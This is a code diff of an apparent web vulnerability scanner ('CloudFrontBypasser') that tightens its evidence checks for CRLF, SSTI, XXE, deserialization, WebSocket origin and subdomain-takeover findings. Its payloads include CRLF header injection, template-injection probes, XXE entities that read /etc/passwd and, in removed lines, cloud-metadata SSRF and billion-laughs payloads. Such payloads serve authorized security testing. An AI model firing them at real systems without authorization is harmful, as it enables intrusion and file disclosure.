-            # Unicode CRLF
-            ('?param=test%E5%98%8D%E5%98%8AInjected:value', 'unicode CRLF'),
-            # Mixed encoding
-            ('?param=test%0d%0a%20Injected:value', 'with space'),
-            # Header injection via param
-            ('?param=test%0d%0aSet-Cookie:evil=value', 'cookie injection'),
-            ('?param=test%0d%0aX-XSS-Protection:0', 'security header injection'),
-            # In different contexts
-            ('/path%0d%0aInjected:value', 'path CRLF'),
-        ]
-        
+        """Require an exact randomized response header/body-boundary canary."""
+        print("  [*] Testing CRLF injection with exact response canaries...")
+        suffix = str(random.randrange(10**8, 10**9))
+        header_name = f'X-Blackthorn-{suffix}'
+        header_value = f'bt-{suffix}'
+        encoded_lines = ('%0d%0a', '%0D%0A', '%0a', '%E5%98%8D%E5%98%8A')
         test_cases = []
-        for payload, technique in crlf_payloads:
+        for line_break in encoded_lines:
+            wire_payload = f'clean{line_break}{header_name}:{header_value}'
+            path = f'/?param={wire_payload}'
             test_cases.append({
-                'headers': {},
-                'path': payload,
-                'technique': f'CRLF: {technique}'
+                'headers': {}, 'path': path,
+                'technique': f'CRLF response header injection ({line_break})',
+                'category': 'CRLF_INJECTION', 'parameter': 'param',
+                'payload': wire_payload,
+                'detector_id': 'crlf-exact-header-v2',
+                'oracle': {
+                    'type': 'header', 'name': header_name, 'value': header_value,
+                    'severity': 'HIGH',
+                    'reason': f'Injected response header observed: {header_name}: {header_value}',
+                },
             })
-        
-        # Also test header injection
-        header_crlf_tests = [
-            {'X-Custom': 'test\r\nInjected: value'},
-            {'X-Custom': 'test%0d%0aInjected: value'},
-            {'User-Agent': 'test\r\nInjected: value'},
+
+        return [
+            r for r in self._batch_test(test_cases)
+            if self._result_has_evidence(r, 'response_header_injection')
         ]
-        
-        for headers in header_crlf_tests:
-            try:
-                resp = safe_request(
-                    self.target,
-                    timeout=self.timeout,
-                    headers=headers,
-                    allow_redirects=False
-                )
-                
-                if resp:
-                    # Check if injected header appears in response
-                    resp_headers_str = str(resp.headers).lower()
-                    if 'injected' in resp_headers_str:
-                        result = {
-                            'technique': 'CRLF: Header Injection',
-                            'bypass': True,
-                            'status': resp.status_code,
-                            'reason': 'Injected header reflected in response',
-                            'severity': 'HIGH',
-                            'category': 'CRLF_INJECTION'
-                        }
-                        results.append(result)
-                        print(f"  [✓] CRLF: Header injection successful")
-                        
-            except Exception as e:
-                logger.debug(f"CRLF header test error: {e}")
-        
-        batch_results = self._batch_test(test_cases)
-        for r in batch_results:
-            r['category'] = 'CRLF_INJECTION'
-            results.append(r)
-        
-        return results
     
     def _test_prototype_pollution(self) -> List[Dict[str, Any]]:
         """Test for prototype pollution vulnerabilities"""
@@ -4872,7 +5739,12 @@ class CloudFrontBypasser(ExtraTechniques):
         ]
         
         test_cases = [
-            {'headers': {}, 'path': path, 'technique': f'Proto Pollution: {technique}'}
+            {
+                'headers': {}, 'path': path,
+                'technique': f'Prototype pollution candidate: {technique}',
+                'category': 'PROTOTYPE_POLLUTION', 'payload': path,
+                'detector_id': 'prototype-behavior-differential-v2',
+            }
             for path, technique in pollution_payloads # test cases for query string pollution
         ]
         
@@ -4887,98 +5759,119 @@ class CloudFrontBypasser(ExtraTechniques):
         
         for json_payload in json_payloads: # test cases for JSON body pollution
             try:
-                import json
-                resp = self._session.post(
-                    self.target,
-                    json=json_payload,
-                    timeout=self.timeout,
-                    verify=False
+                payload_text = json.dumps(json_payload)
+                result = self._test_request(
+                    method='POST', path='/', data=payload_text,
+                    headers={'Content-Type': 'application/json'},
+                    technique='Prototype pollution JSON candidate',
+                    probe={
+                        'category': 'PROTOTYPE_POLLUTION', 'payload': payload_text,
+                        'insertion_point': {'type': 'json-body', 'name': '__proto__'},
+                        'detector_id': 'prototype-behavior-differential-v2',
+                    },
                 )
-                
-                if resp and resp.status_code in [200, 201]:
-                    # Check if pollution indicators in response
-                    if 'polluted' in resp.text.lower() or 'true' in resp.text.lower():
-                        result = {
-                            'technique': 'Proto Pollution: JSON body',
-                            'bypass': True,
-                            'status': resp.status_code,
-                            'reason': 'Pollution payload accepted',
-                            'severity': 'HIGH',
-                            'category': 'PROTOTYPE_POLLUTION'
-                        }
-                        results.append(result)
-                        print(f"  [✓] Prototype Pollution: JSON body may be vulnerable")
+                if result and result.get('bypass'):
+                    # A response delta is only a candidate; acceptance/reflection
+                    # does not prove Object.prototype was modified.
+                    result['verification_status'] = 'candidate'
+                    result['kind'] = 'suspected'
+                    result['severity'] = 'MEDIUM'
+                    result['reason'] = ('JSON prototype payload changed the matched '
+                                        'response; persistent property impact is unverified')
+                    results.append(result)
+                    print("  [!] Prototype pollution behavior candidate")
                         
             except Exception as e:
                 logger.debug(f"JSON pollution test error: {e}")
         
         for r in batch_results:
             r['category'] = 'PROTOTYPE_POLLUTION'
-            results.append(r)
+            if r.get('bypass'):
+                results.append(r)
         
         return results
     
     def _test_ssti_detection(self) -> List[Dict[str, Any]]:
-        """Test for Server-Side Template Injection"""
-        results = []
-        print("  [*] Testing SSTI (Server-Side Template Injection)...")
-        
-        ssti_payloads = [
-            # Jinja2/Twig
-            ('{{7*7}}', 'Jinja2/Twig', '49'),
-            ('{{7*\'7\'}}', 'Jinja2 string mult', '7777777'),
-            ('{%25 set x = 7*7 %25}{{x}}', 'Jinja2 set', '49'),
-            # Freemarker
-            ('${7*7}', 'Freemarker/EL', '49'),
-            ('#{7*7}', 'Freemarker alt', '49'),
-            # Velocity
-            ('#set($x=7*7)$x', 'Velocity', '49'),
-            # Smarty
-            ('{php}echo 7*7;{/php}', 'Smarty PHP', '49'),
-            ('{7*7}', 'Smarty math', '49'),
-            # ERB (Ruby)
-            ('<%=7*7%>', 'ERB', '49'),
-            # Pebble
-            ('{% set x = 7*7 %}{{x}}', 'Pebble', '49'),
-            # Mako
-            ('${7*7}', 'Mako', '49'),
-            # Thymeleaf
-            ('[[${7*7}]]', 'Thymeleaf', '49'),
-            # Generic detection
-            ('{{constructor.constructor(\'return 7*7\')()}}', 'JS Template', '49'),
-            # Python specific
-            ('{{config}}', 'Jinja2 config leak', 'config'),
-            ('{{self.__class__}}', 'Jinja2 class access', 'class'),
-            # Nested/encoded
-            ('{{\'\'.__class__.__mro__[2].__subclasses__()}}', 'Jinja2 subclasses', 'subclasses'),
+        """Detect SSTI with two independent transformed canaries per syntax.
+
+        Older checks searched for words already present in payloads (``class``,
+        ``config``, ``subclasses``) and therefore promoted reflection to CRITICAL.
+        A finding now requires two arithmetic results that are absent from both
+        the raw payload and the matched benign response.
+        """
+        print("  [*] Testing SSTI with paired evaluation canaries...")
+        results: List[Dict[str, Any]] = []
+        from .crawler import build_injection_path
+
+        targets = self._injection_targets()[:5]
+        if not targets:
+            targets = [{'path': '/', 'params': {'test': 'blackthorn-control'}, 'method': 'GET'}]
+
+        syntaxes = [
+            ('Jinja2 / Twig / Pebble', lambda a, b: '{{%d*%d}}' % (a, b)),
+            ('Freemarker / Mako / EL', lambda a, b: '${%d*%d}' % (a, b)),
+            ('Freemarker alternate', lambda a, b: '#{%d*%d}' % (a, b)),
+            ('ERB', lambda a, b: '<%%=%d*%d%%>' % (a, b)),
+            ('Smarty', lambda a, b: '{%d*%d}' % (a, b)),
+            ('Thymeleaf inline', lambda a, b: '[[${%d*%d}]]' % (a, b)),
         ]
-        
-        for payload, engine, expected in ssti_payloads:
-            try:
-                encoded_payload = quote(payload)
-                resp = safe_request(
-                    f"{self.target}/?test={encoded_payload}",
-                    timeout=self.timeout,
-                    allow_redirects=True
+        operand_pairs = ((37, 41), (43, 47))
+
+        for ep in targets:
+            path, params = ep['path'], dict(ep['params'])
+            for parameter in params:
+                control_path = build_injection_path(
+                    path, params, parameter, params.get(parameter, 'blackthorn-control')
                 )
-                
-                if resp and expected in resp.text:
-                    severity = 'CRITICAL' if expected == '49' or 'class' in expected else 'HIGH'
-                    result = {
-                        'technique': f'SSTI: {engine}',
-                        'bypass': True,
-                        'status': resp.status_code,
-                        'reason': f'Template evaluated: {payload[:30]} -> {expected}',
-                        'severity': severity,
-                        'category': 'SSTI',
-                        'details': {'engine': engine, 'payload': payload}
+                for engine, formatter in syntaxes:
+                    paired = []
+                    for left, right in operand_pairs:
+                        payload = formatter(left, right)
+                        expected = str(left * right)
+                        probe_path = build_injection_path(path, params, parameter, payload)
+                        result = self._test_request(
+                            path=probe_path,
+                            technique=f'SSTI: {engine} [{parameter}]',
+                            probe={
+                                'category': 'SSTI', 'payload': payload,
+                                'parameter': parameter,
+                                'insertion_point': {'type': 'query', 'name': parameter},
+                                'detector_id': 'ssti-paired-arithmetic-v2',
+                                'control': {'method': 'GET', 'path': control_path,
+                                            'headers': {}, 'data': None},
+                                'oracle': {
+                                    'type': 'marker', 'value': expected,
+                                    'payload': payload, 'severity': 'HIGH',
+                                    'reason': (f'Template expression evaluated: '
+                                               f'{payload} → {expected}'),
+                                },
+                            },
+                        )
+                        if result and result.get('verification_status') == 'confirmed':
+                            paired.append(result)
+                    if len(paired) != 2:
+                        continue
+
+                    finding = paired[0]
+                    finding['reason'] = (
+                        f'Two independent {engine} expressions evaluated: '
+                        f"{paired[0]['payload']} and {paired[1]['payload']}"
+                    )
+                    finding['evidence'] = (
+                        list(paired[0].get('evidence') or []) +
+                        list(paired[1].get('evidence') or [])
+                    )
+                    finding['payloads'] = [p['payload'] for p in paired]
+                    finding['verification_status'] = 'confirmed'
+                    finding['kind'] = 'finding'
+                    finding['confidence'] = 'high'
+                    finding['confirmations'] = '2/2 paired probes'
+                    finding['details'] = {
+                        'engine': engine, 'payloads': finding['payloads'],
+                        'parameter': parameter,
                     }
-                    results.append(result)
-                    print(f"  [✓] CRITICAL: SSTI detected ({engine})")
-                    
-            except Exception as e:
-                logger.debug(f"SSTI test error: {e}")
-        
+                    results.append(finding)
+                    print(f"  [✓] HIGH: SSTI confirmed ({engine}, {parameter})")
         return results
     
     def _test_xxe_detection(self) -> List[Dict[str, Any]]:
@@ -4993,10 +5886,6 @@ class CloudFrontBypasser(ExtraTechniques):
             ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>', 'php filter'),
             # Parameter entity
             ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo></foo>', 'parameter entity'),
-            # SSRF via XXE
-            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>', 'SSRF'),
-            # Billion laughs (DoS detection)
-            ('<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]><lolz>&lol2;</lolz>', 'billion laughs'),
             # XInclude
             ('<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>', 'XInclude'),
         ]
@@ -5012,31 +5901,33 @@ class CloudFrontBypasser(ExtraTechniques):
         for endpoint in xml_endpoints:
             for payload, technique in xxe_payloads:
                 try:
-                    resp = self._session.post(
-                        endpoint,
-                        data=payload,
+                    endpoint_path = urlparse(endpoint).path or '/'
+                    result = self._test_request(
+                        method='POST', path=endpoint_path, data=payload,
                         headers={'Content-Type': 'application/xml'},
-                        timeout=self.timeout,
-                        verify=False
+                        technique=f'XXE: {technique}',
+                        probe={
+                            'category': 'XXE', 'payload': payload,
+                            'insertion_point': {'type': 'body', 'name': 'xml'},
+                            'detector_id': 'xxe-file-signature-v2',
+                            'control': {
+                                'method': 'POST', 'path': endpoint_path,
+                                'headers': {'Content-Type': 'application/xml'},
+                                'data': '<?xml version="1.0"?><foo>blackthorn-control</foo>',
+                            },
+                            'oracle': {
+                                'type': 'regex',
+                                'patterns': [r'(?m)^root:[^:\r\n]*:0:0:',
+                                             r'(?m)^daemon:[^:\r\n]*:\d+:\d+:'],
+                                'severity': 'CRITICAL',
+                                'reason': 'External entity returned Unix account-file contents',
+                            },
+                        },
                     )
-                    
-                    if resp:
-                        # Check for XXE indicators
-                        indicators = ['root:', '/bin/bash', 'nobody', 'daemon', '169.254', 'meta-data', 'lollol']
-                        for indicator in indicators:
-                            if indicator in resp.text:
-                                result = {
-                                    'technique': f'XXE: {technique}',
-                                    'bypass': True,
-                                    'status': resp.status_code,
-                                    'reason': f'XXE successful at {endpoint}',
-                                    'severity': 'CRITICAL',
-                                    'category': 'XXE',
-                                    'details': {'endpoint': endpoint, 'technique': technique}
-                                }
-                                results.append(result)
-                                print(f"  [✓] CRITICAL: XXE detected ({technique})")
-                                break
+                    if self._result_has_evidence(result, 'response_signature'):
+                        result['details'] = {'endpoint': endpoint, 'technique': technique}
+                        results.append(result)
+                        print(f"  [✓] CRITICAL: XXE detected ({technique})")
                                 
                 except Exception as e:
                     logger.debug(f"XXE test error: {e}")
@@ -5051,26 +5942,35 @@ class CloudFrontBypasser(ExtraTechniques):
         soap_endpoints = ['/soap', '/wsdl', '/ws', '/service', '/api/soap']
         for endpoint in soap_endpoints:
             try:
-                resp = self._session.post(
-                    f"{self.target}{endpoint}",
-                    data=soap_payload,
+                result = self._test_request(
+                    method='POST', path=endpoint, data=soap_payload,
                     headers={'Content-Type': 'application/soap+xml'},
-                    timeout=self.timeout,
-                    verify=False
+                    technique='XXE: SOAP endpoint',
+                    probe={
+                        'category': 'XXE', 'payload': soap_payload,
+                        'insertion_point': {'type': 'body', 'name': 'soap'},
+                        'detector_id': 'xxe-soap-file-signature-v2',
+                        'control': {
+                            'method': 'POST', 'path': endpoint,
+                            'headers': {'Content-Type': 'application/soap+xml'},
+                            'data': ('<?xml version="1.0"?><soap:Envelope '
+                                     'xmlns:soap="http://www.w3.org/2003/05/soap-envelope">'
+                                     '<soap:Body><foo>blackthorn-control</foo></soap:Body>'
+                                     '</soap:Envelope>'),
+                        },
+                        'oracle': {
+                            'type': 'regex',
+                            'patterns': [r'(?m)^root:[^:\r\n]*:0:0:'],
+                            'severity': 'CRITICAL',
+                            'reason': 'SOAP external entity returned Unix account-file contents',
+                        },
+                    },
                 )
-                if resp and 'root:' in resp.text:
-                    result = {
-                        'technique': 'XXE: SOAP Endpoint',
-                        'bypass': True,
-                        'status': resp.status_code,
-                        'reason': f'SOAP XXE at {endpoint}',
-                        'severity': 'CRITICAL',
-                        'category': 'XXE'
-                    }
+                if self._result_has_evidence(result, 'response_signature'):
                     results.append(result)
                     print(f"  [✓] CRITICAL: SOAP XXE detected")
-            except:
-                pass
+            except Exception as e:
+                logger.debug(f"SOAP XXE test error: {e}")
         
         return results
     
@@ -5107,27 +6007,26 @@ class CloudFrontBypasser(ExtraTechniques):
         # Test Java serialization
         for payload, technique in java_payloads:
             try:
-                # Test in body
-                resp = self._session.post(
-                    self.target,
-                    data=payload,
+                result = self._test_request(
+                    method='POST', path='/', data=payload,
                     headers={'Content-Type': 'application/x-java-serialized-object'},
-                    timeout=self.timeout,
-                    verify=False
+                    technique=f'Deserialization surface: {technique}',
+                    probe={
+                        'category': 'DESERIALIZATION', 'payload': payload,
+                        'insertion_point': {'type': 'body', 'name': 'serialized-object'},
+                        'detector_id': 'deserialization-parser-observation-v2',
+                    },
                 )
-                
-                if resp and resp.status_code not in [400, 415]:
-                    # Server accepted serialized data
-                    result = {
-                        'technique': f'Deserialization: {technique}',
-                        'bypass': True,
-                        'status': resp.status_code,
-                        'reason': 'Server accepts Java serialized objects',
-                        'severity': 'HIGH',
-                        'category': 'DESERIALIZATION'
-                    }
+                if result is not None and result.get('status') not in [400, 415]:
+                    result.update({
+                        'bypass': False, 'kind': 'observation',
+                        'verification_status': 'informational', 'confidence': 'medium',
+                        'severity': 'INFO',
+                        'reason': ('Endpoint accepted the serialization media type; '
+                                   'object deserialization or gadget execution is unproven'),
+                    })
                     results.append(result)
-                    print(f"  [!] Potential: {technique} accepted")
+                    print(f"  [+] Serialization surface: {technique} accepted")
                     
             except Exception as e:
                 logger.debug(f"Java deser test error: {e}")
@@ -5135,41 +6034,54 @@ class CloudFrontBypasser(ExtraTechniques):
         # Test PHP serialization
         for payload, technique in php_payloads:
             try:
-                resp = self._session.post(
-                    self.target,
-                    data=payload,
+                body_result = self._test_request(
+                    method='POST', path='/', data=payload,
                     headers={'Content-Type': 'application/x-php-serialized'},
-                    timeout=self.timeout,
-                    verify=False
+                    technique=f'Deserialization candidate: {technique} (body)',
+                    probe={
+                        'category': 'DESERIALIZATION', 'payload': payload,
+                        'insertion_point': {'type': 'body', 'name': 'serialized-object'},
+                        'detector_id': 'php-deserialization-response-v2',
+                        'oracle': {
+                            'type': 'regex',
+                            'patterns': [r'object of class stdclass',
+                                         r'unserialize\(\).{0,120}(?:notice|warning|error)'],
+                            'severity': 'MEDIUM', 'confidence': 'medium',
+                            'verification_status': 'candidate', 'kind': 'suspected',
+                            'reason': 'PHP unserialize-specific response appeared only after the probe',
+                        },
+                    },
                 )
-                
-                # Also test in query params
-                resp2 = safe_request(
-                    f"{self.target}/?data={quote(payload)}",
-                    timeout=self.timeout
+                query_result = self._test_request(
+                    path='/?' + urlencode({'data': payload}),
+                    technique=f'Deserialization candidate: {technique} (query)',
+                    probe={
+                        'category': 'DESERIALIZATION', 'payload': payload,
+                        'parameter': 'data',
+                        'insertion_point': {'type': 'query', 'name': 'data'},
+                        'detector_id': 'php-deserialization-response-v2',
+                        'oracle': {
+                            'type': 'regex',
+                            'patterns': [r'object of class stdclass',
+                                         r'unserialize\(\).{0,120}(?:notice|warning|error)'],
+                            'severity': 'MEDIUM', 'confidence': 'medium',
+                            'verification_status': 'candidate', 'kind': 'suspected',
+                            'reason': 'PHP unserialize-specific response appeared only after the probe',
+                        },
+                    },
                 )
-                
-                for r in [resp, resp2]:
-                    if r and 'unserialize' not in r.text.lower() and r.status_code not in [400, 415, 500]:
-                        if 'stdClass' in r.text or 'Object' in r.text:
-                            result = {
-                                'technique': f'Deserialization: {technique}',
-                                'bypass': True,
-                                'status': r.status_code,
-                                'reason': 'PHP serialized data processed',
-                                'severity': 'HIGH',
-                                'category': 'DESERIALIZATION'
-                            }
-                            results.append(result)
-                            print(f"  [!] Potential: {technique} processed")
+                for candidate in (body_result, query_result):
+                    if candidate and candidate.get('bypass'):
+                        results.append(candidate)
+                        print(f"  [!] Deserialization candidate: {technique}")
                             
             except Exception as e:
                 logger.debug(f"PHP deser test error: {e}")
         
         # Check for ViewState
         try:
-            resp = safe_request(self.target, timeout=self.timeout)
-            if resp and '__VIEWSTATE' in resp.text:
+            resp = self._scoped_safe_request(self.target, timeout=self.timeout)
+            if resp is not None and '__VIEWSTATE' in resp.text:
                 # Check if ViewState is unencrypted/unsigned
                 import re
                 viewstate_match = re.search(r'__VIEWSTATE["\s]+value="([^"]+)"', resp.text)
@@ -5179,11 +6091,15 @@ class CloudFrontBypasser(ExtraTechniques):
                     if viewstate.startswith('/w') or viewstate.startswith('dD'):
                         result = {
                             'technique': 'Deserialization: ASP.NET ViewState',
-                            'bypass': True,
+                            'bypass': False,
                             'status': resp.status_code,
-                            'reason': 'Unencrypted ViewState detected',
-                            'severity': 'MEDIUM',
+                            'reason': ('ASP.NET ViewState field detected; base64 encoding '
+                                       'does not prove missing MAC or encryption'),
+                            'severity': 'INFO',
                             'category': 'DESERIALIZATION',
+                            'kind': 'observation',
+                            'verification_status': 'informational',
+                            'confidence': 'high',
                             'details': {'viewstate_preview': viewstate[:50]}
                         }
                         results.append(result)
@@ -5231,14 +6147,14 @@ class CloudFrontBypasser(ExtraTechniques):
         
         for test in h2c_tests:
             try:
-                resp = safe_request(
+                resp = self._scoped_safe_request(
                     self.target,
                     timeout=self.timeout,
                     headers=test['headers'],
                     allow_redirects=False
                 )
                 
-                if resp:
+                if resp is not None:
                     # Check for successful H2C upgrade
                     if resp.status_code == 101 or 'upgrade' in resp.headers.get('Connection', '').lower():
                         result = {
@@ -5289,7 +6205,7 @@ class CloudFrontBypasser(ExtraTechniques):
                     'Connection': 'Upgrade',
                     'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
                     'Sec-WebSocket-Version': '13',
-                    'Origin': 'https://evil.com',  # Cross-origin
+                    'Origin': 'https://blackthorn.invalid',  # Controlled cross-origin canary
                 },
                 'path': endpoint,
                 'technique': f'CSWSH: {endpoint}'
@@ -5309,28 +6225,60 @@ class CloudFrontBypasser(ExtraTechniques):
         
         for test in ws_tests:
             try:
-                resp = safe_request(
+                resp = self._scoped_safe_request(
                     f"{self.target}{test['path']}",
                     timeout=self.timeout,
                     headers=test['headers'],
                     allow_redirects=False
                 )
                 
-                if resp:
+                if resp is not None:
                     # 101 Switching Protocols means WebSocket upgrade succeeded
                     if resp.status_code == 101:
-                        is_cswsh = 'evil.com' in test['headers'].get('Origin', '')
+                        is_cswsh = 'blackthorn.invalid' in test['headers'].get('Origin', '')
+                        has_auth_context = bool(
+                            self._session.cookies
+                            or self._session.headers.get('Authorization')
+                        )
+                        reason = (
+                            'WebSocket handshake accepted a controlled cross-origin Origin; '
+                            'authenticated message access and impact are not proven'
+                            if is_cswsh else
+                            'WebSocket handshake succeeded without an Origin header; endpoint '
+                            'authentication and browser reachability need manual review'
+                        )
                         result = {
                             'technique': test['technique'],
                             'bypass': is_cswsh,
                             'status': resp.status_code,
-                            'reason': 'WebSocket upgrade accepted' + (' from cross-origin!' if is_cswsh else ''),
-                            'severity': 'HIGH' if is_cswsh else 'INFO',
-                            'category': 'WEBSOCKET_SECURITY'
+                            'reason': reason,
+                            'severity': ('MEDIUM' if is_cswsh and has_auth_context
+                                         else 'LOW' if is_cswsh else 'INFO'),
+                            'category': 'WEBSOCKET_SECURITY',
+                            'kind': 'suspected' if is_cswsh else 'observation',
+                            'verification_status': ('candidate' if is_cswsh
+                                                    else 'informational'),
+                            'confidence': 'medium' if is_cswsh else 'high',
+                            'method': 'GET', 'path': test['path'],
+                            'url': f"{self.target}{test['path']}",
+                            'headers': dict(test['headers']),
+                            'request': {
+                                'method': 'GET', 'path': test['path'],
+                                'url': f"{self.target}{test['path']}",
+                                'headers': dict(test['headers']), 'body': None,
+                            },
+                            'response': {'status': resp.status_code,
+                                         'headers': dict(resp.headers)},
+                            'evidence': [{
+                                'type': 'websocket_origin_acceptance',
+                                'description': reason,
+                                'matched': test['headers'].get('Origin', 'absent'),
+                            }],
+                            '_no_reconfirm': True,
                         }
                         results.append(result)
                         if is_cswsh:
-                            print(f"  [✓] CSWSH: {test['path']} accepts cross-origin")
+                            print(f"  [!] CSWSH candidate: {test['path']} accepts cross-origin")
                     elif resp.status_code == 200 and 'websocket' in resp.text.lower():
                         result = {
                             'technique': f"WS Endpoint Found: {test['path']}",
@@ -5338,7 +6286,9 @@ class CloudFrontBypasser(ExtraTechniques):
                             'status': resp.status_code,
                             'reason': 'WebSocket endpoint detected',
                             'severity': 'INFO',
-                            'category': 'WEBSOCKET_SECURITY'
+                            'category': 'WEBSOCKET_SECURITY',
+                            'kind': 'observation',
+                            'verification_status': 'informational',
                         }
                         results.append(result)
                         
@@ -5352,61 +6302,53 @@ class CloudFrontBypasser(ExtraTechniques):
     # ============================================================================
     
     def _test_subdomain_takeover(self) -> List[Dict[str, Any]]:
-        """Test for subdomain takeover vulnerabilities"""
+        """Find existing subdomains with provider-specific unclaimed-site proof.
+
+        NXDOMAIN alone is never a takeover: without an existing delegated DNS
+        record there is nothing for an attacker to claim.
+        """
         results = []
         print("  [*] Testing subdomain takeover...")
         
-        # Fingerprints for vulnerable services
+        # Restrict matches to provider-specific *unclaimed resource* messages.
+        # Generic provider domains and generic 404 text are not evidence.
         takeover_fingerprints = {
-            'github': ['There isn\'t a GitHub Pages site here', 'github.io'],
-            'heroku': ['No such app', 'herokucdn.com', 'herokuapp.com'],
-            'aws_s3': ['NoSuchBucket', 'The specified bucket does not exist'],
-            'azure': ['404 Web Site not found', '.azurewebsites.net'],
-            'shopify': ['Sorry, this shop is currently unavailable', 'myshopify.com'],
-            'tumblr': ['There\'s nothing here', 'tumblr.com'],
-            'wordpress': ['Do you want to register', 'wordpress.com'],
-            'teamwork': ['Oops - We didn\'t find your site', 'teamwork.com'],
-            'helpjuice': ['We could not find what you\'re looking for', 'helpjuice.com'],
-            'helpscout': ['No settings were found', 'helpscoutdocs.com'],
-            'cargo': ['If you\'re moving your domain', '404 Not Found'],
-            'uservoice': ['This UserVoice subdomain', 'uservoice.com'],
-            'surge': ['project not found', 'surge.sh'],
-            'intercom': ['This page is reserved for', 'custom.intercom.help'],
-            'webflow': ['The page you are looking for doesn\'t exist', 'webflow.io'],
-            'kajabi': ['The page you were looking for doesn\'t exist', 'kajabi.com'],
-            'thinkific': ['You may have mistyped the address', 'thinkific.com'],
-            'tave': ['Sorry, this page is no longer available', 'tave.com'],
-            'wishpond': ['https://www.wishpond.com/404', 'wishpond.com'],
-            'aftership': ['Oops.</h2>', 'aftership.com'],
-            'aha': ['There is no portal here', 'ideas.aha.io'],
-            'brightcove': ['Error - Loss', 'bcvp0rtal.com'],
-            'bigcartel': ['<h1>Oops! We couldn&#8217;t find that page.</h1>', 'bigcartel.com'],
-            'campaignmonitor': ['Trying to access your account?', 'createsend.com'],
-            'acquia': ['The site you are looking for could not be found', 'acquia-test.co'],
-            'fastly': ['Fastly error: unknown domain', 'fastly.net'],
-            'ghost': ['The thing you were looking for is no longer here', 'ghost.io'],
-            'pantheon': ['The gods are wise', 'pantheonsite.io'],
-            'zendesk': ['Help Center Closed', 'zendesk.com'],
+            'github_pages': ["There isn't a GitHub Pages site here"],
+            'heroku': ['No such app'],
+            'aws_s3': ['<Code>NoSuchBucket</Code>',
+                       'The specified bucket does not exist'],
+            'azure_web_apps': ['404 Web Site not found'],
+            'shopify': ['Sorry, this shop is currently unavailable'],
+            'surge': ['project not found'],
+            'fastly': ['Fastly error: unknown domain'],
+            'pantheon': ['The gods are wise, but do not know of the site'],
+            'zendesk': ['Help Center Closed'],
         }
         
         # First enumerate subdomains
-        domain_parts = self.domain.split('.')
-        if len(domain_parts) >= 2:
-            base_domain = '.'.join(domain_parts[-2:])
-        else:
-            base_domain = self.domain
+        target_hostname = urlparse(self.target).hostname or self.domain
+        # Do not guess eTLD+1 by taking the last two labels (which would turn
+        # app.example.co.uk into the unrelated public suffix co.uk). Without a
+        # PSL dependency, stay beneath the exact authorized hostname.
+        base_domain = target_hostname
         
         prefixes = ['www', 'dev', 'staging', 'test', 'api', 'app', 'admin', 'beta', 'cdn', 'mail', 'blog', 'shop', 'store']
         
         def check_takeover(subdomain: str) -> Optional[Dict]:
             try:
-                # Try to resolve and fetch
+                # An existing address/delegation is a prerequisite. NXDOMAIN is
+                # an ordinary absent name and must not be reported.
+                try:
+                    socket.getaddrinfo(subdomain, None)
+                except socket.gaierror:
+                    return None
+
                 for protocol in ['https', 'http']:
                     try:
                         url = f"{protocol}://{subdomain}"
-                        resp = safe_request(url, timeout=5, allow_redirects=True)
+                        resp = self._scoped_safe_request(url, timeout=5, allow_redirects=True)
                         
-                        if resp:
+                        if resp is not None:
                             body = resp.text.lower()
                             for service, fingerprints in takeover_fingerprints.items():
                                 for fp in fingerprints:
@@ -5420,18 +6362,6 @@ class CloudFrontBypasser(ExtraTechniques):
                     except:
                         pass
                         
-                # Check for dangling CNAME
-                try:
-                    import socket
-                    socket.gethostbyname(subdomain)
-                except socket.gaierror as e:
-                    if 'NXDOMAIN' in str(e) or 'not known' in str(e).lower():
-                        return {
-                            'subdomain': subdomain,
-                            'service': 'NXDOMAIN',
-                            'fingerprint': 'DNS not resolving',
-                            'status': 0
-                        }
             except:
                 pass
             return None
@@ -5443,18 +6373,27 @@ class CloudFrontBypasser(ExtraTechniques):
             for future in as_completed(futures):
                 result_data = future.result()
                 if result_data:
-                    severity = 'HIGH' if result_data['service'] != 'NXDOMAIN' else 'MEDIUM'
                     result = {
                         'technique': f"Subdomain Takeover: {result_data['subdomain']}",
                         'bypass': True,
                         'status': result_data['status'],
                         'reason': f"Service: {result_data['service']} | {result_data['fingerprint'][:40]}",
-                        'severity': severity,
+                        'severity': 'HIGH',
                         'category': 'SUBDOMAIN_TAKEOVER',
-                        'details': result_data
+                        'kind': 'suspected', 'verification_status': 'candidate',
+                        'confidence': 'medium',
+                        'evidence': [{
+                            'type': 'provider_unclaimed_fingerprint',
+                            'description': ('Existing host returned a provider-specific '
+                                            'unclaimed-resource message'),
+                            'matched': result_data['fingerprint'],
+                        }],
+                        'details': result_data,
+                        '_no_reconfirm': True,
                     }
                     results.append(result)
-                    print(f"  [✓] Takeover: {result_data['subdomain']} ({result_data['service']})")
+                    print(f"  [!] Takeover candidate: {result_data['subdomain']} "
+                          f"({result_data['service']}; verify claimability)")
         
         return results
     
@@ -5464,8 +6403,8 @@ class CloudFrontBypasser(ExtraTechniques):
         print("  [*] Auditing security headers...")
         
         try:
-            resp = safe_request(self.target, timeout=self.timeout, allow_redirects=True)
-            if not resp:
+            resp = self._scoped_safe_request(self.target, timeout=self.timeout, allow_redirects=True)
+            if resp is None:
                 return results
             
             headers_lower = {k.lower(): v for k, v in resp.headers.items()}
@@ -5605,8 +6544,8 @@ class CloudFrontBypasser(ExtraTechniques):
         print("  [*] Testing cookie security...")
         
         try:
-            resp = safe_request(self.target, timeout=self.timeout, allow_redirects=True)
-            if not resp:
+            resp = self._scoped_safe_request(self.target, timeout=self.timeout, allow_redirects=True)
+            if resp is None:
                 return results
             
             # Parse Set-Cookie headers
@@ -5744,45 +6683,97 @@ class CloudFrontBypasser(ExtraTechniques):
             ('/phpmyadmin', 'phpMyAdmin', 'HIGH'),
             ('/adminer.php', 'Adminer', 'HIGH'),
         ]
+
+        # Calibrate against a random missing route so branded soft-404 pages do
+        # not become critical ".env" or backup findings.
+        soft404 = None
+        try:
